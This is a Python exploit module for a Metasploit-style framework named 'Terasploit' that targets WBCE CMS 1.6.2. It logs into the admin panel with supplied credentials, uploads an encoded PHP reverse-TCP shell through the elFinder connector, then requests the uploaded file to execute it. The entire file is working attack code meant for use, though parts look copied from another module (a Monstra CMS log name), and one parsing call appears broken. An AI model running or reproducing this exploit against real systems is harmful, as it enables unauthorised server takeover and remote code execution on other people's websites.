#######
# Module/Exploit: WBCE CMS Authenticated Remote Code Execution
#######

from libs.terasploit.framework.opts.opt_container import *
from libs.terasploit.framework.info.info_container import *
from libs.terasploit.framework.module.exploit import *

class TerasploitModule(Exploit):
    
    def initialize(self,info_only: bool = False) -> None:
        update_info (
            {
                'License'     : 'Terasploit Framework License (BSD)',
                'Name'        : 'WBCE CMS Authenticated Remote Code Execution',
                'Version'     : '1.6.2',
                'Module'      : Module.exploit,
                'Payload'     : 'modules/payload/php/shell_reverse_tcp',
                'Arch'        : Arch.PHP,
                "Platform"    : Platform.PHP,
                'Author'      : [
                    'Charlie <rupture6.dev[at]gmail.com>',
                ],
                'Description' : [
                    'A remote code execution (RCE) vulnerability in WBCE CMS version 1.6.2',
                    'allowing attackers to upload a shell on the target.',
                ],
                'Reference'   : [
                    'https://www.exploit-db.com/exploits/52039'
                ]
            }
        )

        if info_only:
            return
        
        register_option ('exploit',opt=[
            OptURL.create('rhost',['','yes','the remote host target (url)']),
            OptProxy.create('proxy',['','no','json file containing proxies, json format {"protocol":"proxy",...}']),
            OptBool.create('ssl_verify',['false','no','check ssl certificate on the host']),
            OptString.create('username',['','yes','username to use for authentication']),
            OptString.create('password',['','yes','password to use for authentication'])
        ])


    def login(self) -> bool:
        _, proxy, verify, username, password = self.OPT()
        
        print_info ('Logging in using specified credentials...')
        admin_login = HTTP.session.post(
            url=f'{Target.scheme}://{Target.hostname}/admin/login/index.php',
            proxies=self.GetProxy(proxy),
            verify=self.GetBoolean(verify)
        )
        web_scrape = BeautifulSoup(admin_login.text,'html.parser')
        form = web_scrape.find('form', attrs={'name':'login'})
        
        form_data = {input_tag['name']: input_tag.get('value','') for input_tag in form.findall('input') if input_tag.get('type') != 'submit'}
        form_data[web_scrape.find('input', {'name': 'username_fieldname'})['value']] = username
        form_data[web_scrape.find('input', {'name': 'password_fieldname'})['value']] = password
        
        login_response = HTTP.session.post(
            url=f'{Target.scheme}://{Target.hostname}/admin/login/index.php',
            data=form_data,
            proxies=self.GetProxy(proxy),
            verify=self.GetBoolean(verify)
        )
        
        if 'Administration' in login_response.text:
            return True
        else:
            print_info ("Saving response/headers as monstra_cms_headers&response.txt...")
            with open(f'monstra_cms_headers&response.txt','w') as text_file:
                text_file.write(
                        f'[*] HEADERS RECEIVED \n{login_response.headers}\n' + 
                        f'[*] RESPONSE TEXT \n{login_response.text[:500]}\n'
                    )
            return False


    def exploit(self) -> tuple[str,bool]:
        payload, _ = Get.payload()
        target, proxy, verify, _, _ = self.OPT()
        self.ParseURL(target)
        
        shell = self.EncodeShell(payload.generate())
        rand = self.generate_random_name()
        Shell.new(f"{Target.scheme}://{Target.hostname}/media/{rand}.inc")

        try:
            if self.login():
                exploit = HTTP.session.post(
                    url=f'{Target.scheme}://{Target.hostname}/modules/elfinder/ef/php/connector.wbce.php',
                    files={'upload[]':('shell.inc',shell,'application/octet-stream')},
                    data={'reqid':'18f3a5c13d42c5','cmd':'upload','target':'l1_Lw','mtime[]':'1714669495'},
                    proxies=self.GetProxy(proxy),
                    verify=self.GetBoolean(verify)
                )
                
                if exploit.status_code in self.good_status_code():
                    print_info (f'Uploaded: {Shell.get()}', type="GREEN")
                    print_info ('Attempting to execute payload...')
                    HTTP.Request('get',url=Shell.get(),timeout=20)
                    return
                else:
                    print_info (f'Exploit failed, status code: {exploit.status_code}',type='red')
                    return 'failed'
            else:
                print_info("Failed to login using specified credentials")
                HTTP.new_session()
                return 'failed'
                
        except Exception as error:
            print_info (error,type='red')
            HTTP.new_session()
            return 'failed'